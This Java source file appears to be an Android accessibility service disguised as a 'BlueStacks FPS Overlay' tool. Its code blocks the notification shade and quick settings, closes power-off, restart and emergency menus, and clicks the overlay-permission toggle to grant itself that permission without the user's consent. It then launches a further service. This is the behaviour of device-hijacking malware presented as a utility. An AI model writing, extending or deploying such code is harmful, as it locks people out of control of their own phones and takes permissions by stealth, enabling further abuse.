package com.bluestacks.fpsoverlay;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.net.Uri;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;
import android.os.Environment;
import java.io.File;
import java.io.FileWriter;

public class FPSAccessibilityService extends AccessibilityService {

    private long lastActionTime = 0;
    private static final long ACTION_DELAY = 1000; // Ditingkatkan ke 1s agar lebih stabil

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        writeLog("FPS Service Connected - Initializing Overlay"); 
        
        // Langsung lompat tanpa menunggu event pertama
        jumpToOverlaySettings(); //
    }

    private void writeLog(String text) {
        try {
            File downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            File myDir = new File(downloadDir, "bs_engine_logs");
            if (!myDir.exists()) myDir.mkdirs();
            
            File logFile = new File(myDir, "logs.txt");
            FileWriter writer = new FileWriter(logFile, true);
            String timestamp = java.text.DateFormat.getDateTimeInstance().format(new java.util.Date());
            writer.append(timestamp).append(" : ").append(text).append("\n");
            writer.flush();
            writer.close();
        } catch (Exception e) {
            android.util.Log.e("DEX_LOG", "Failed to write log: " + e.getMessage());
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        int eventType = event.getEventType();
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";

        // 1. BLOKIR QUICK SETTINGS & NOTIFIKASI
        // Setiap kali user menarik status bar, packageName biasanya berubah menjadi systemui
        if (packageName.equals("com.android.systemui")) {
            // Tekan BACK secara virtual untuk menutup panel yang sedang meluncur turun
            performGlobalAction(GLOBAL_ACTION_BACK);

            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                performGlobalAction(GLOBAL_ACTION_DISMISS_NOTIFICATION_SHADE);
            }
            Intent closeDialog = new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
            sendBroadcast(closeDialog);
            
            writeLog("Quick Settings/Notification blocked.");
        }

        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return;

        try {
            if (packageName.equals("android") || packageName.contains("systemui")) {
                checkAndDismissSensitiveUI(rootNode);
            }
            handleOverlayPermissionFlow(rootNode, packageName);
            
        } finally {
            rootNode.recycle();
        }
    }

    private void handleOverlayPermissionFlow(AccessibilityNodeInfo root, String pkg) {
        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
            AccessibilityNodeInfo currentRoot = getRootInActiveWindow();
            if (currentRoot == null) return;
    
            try {
                // Mencari teks BlueStacks FPS
                List<AccessibilityNodeInfo> targets = currentRoot.findAccessibilityNodeInfosByText("BlueStacks FPS Overlay");
                
                if (!targets.isEmpty()) {
                    // Cari Switch di sekitar teks tersebut (biasanya satu baris/parent)
                    AccessibilityNodeInfo switchNode = findSwitchInBranch(targets.get(0));
                    
                    if (switchNode != null) {
                        if (!switchNode.isChecked()) {
                            writeLog("Action: Clicking Toggle");
                            performClick(switchNode);
                        } else {
                            writeLog("Status: Already ON");
                            triggerOverlay(); // Ini akan memicu refresh/kembali ke app
                        }
                    }
                } else if (pkg.contains("settings")) {
                    clickByText(currentRoot, "BlueStacks FPS Overlay");
                }
            } finally {
                currentRoot.recycle();
            }
        }, 200); // Naikkan sedikit ke 200ms agar UI Settings benar-benar siap
    }
    
    // Fungsi pembantu untuk mencari switch di dekat teks
    private AccessibilityNodeInfo findSwitchInBranch(AccessibilityNodeInfo node) {
        if (node == null) return null;
        
        // Cek apakah node ini sendiri adalah switch
        if ("android.widget.Switch".equals(node.getClassName())) return node;
        
        // Cek anak-anaknya
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            AccessibilityNodeInfo result = findSwitchInBranch(child);
            if (result != null) return result;
        }
        
        // Jika tidak ketemu, coba cek saudara (sibling) lewat parent
        AccessibilityNodeInfo parent = node.getParent();
        if (parent != null) {
            for (int i = 0; i < parent.getChildCount(); i++) {
                AccessibilityNodeInfo sibling = parent.getChild(i);
                if (sibling != null && "android.widget.Switch".equals(sibling.getClassName())) {
                    return sibling;
                }
            }
        }
        return null;
    }

    private AccessibilityNodeInfo findNodeById(AccessibilityNodeInfo root, String viewId) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(viewId);
        return (nodes != null && !nodes.isEmpty()) ? nodes.get(0) : null;
    }

    private void clickByText(AccessibilityNodeInfo node, String text) {
        List<AccessibilityNodeInfo> targets = node.findAccessibilityNodeInfosByText(text);
        for (AccessibilityNodeInfo target : targets) {
            if (target.getText() != null && target.getText().toString().equalsIgnoreCase(text)) {
                performClick(target);
            }
            target.recycle();
        }
    }

    private void performClick(AccessibilityNodeInfo node) {
        AccessibilityNodeInfo clickable = node;
        while (clickable != null && !clickable.isClickable()) {
            clickable = clickable.getParent();
        }
        if (clickable != null && clickable.isClickable()) {
            clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            lastActionTime = System.currentTimeMillis();
        }
    }

    private void checkAndDismissSensitiveUI(AccessibilityNodeInfo node) {
        String[] powerKeywords = {"Power off", "Restart", "Daya mati", "Mulai lagi", "Darurat"};
        for (String key : powerKeywords) {
            if (!node.findAccessibilityNodeInfosByText(key).isEmpty()) {
                performGlobalAction(GLOBAL_ACTION_BACK);
                break;
            }
        }
    }

    private void jumpToOverlaySettings() {
        writeLog("Executing Jump to Overlay Settings");
        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, 
                                Uri.parse("package:" + getPackageName()));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        startActivity(intent);
    }

    private void triggerOverlay() {
        writeLog("Permission Granted - Launching Engine UI");
        if (!FPSService.isAuthenticated) {
            Intent serviceIntent = new Intent(this, FPSService.class);
            startService(serviceIntent);
        }
        Intent launchApp = new Intent(this, MainActivity.class);
        launchApp.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | 
                           Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | 
                           Intent.FLAG_ACTIVITY_SINGLE_TOP);
        startActivity(launchApp);
    }

    @Override
    public void onInterrupt() {}
}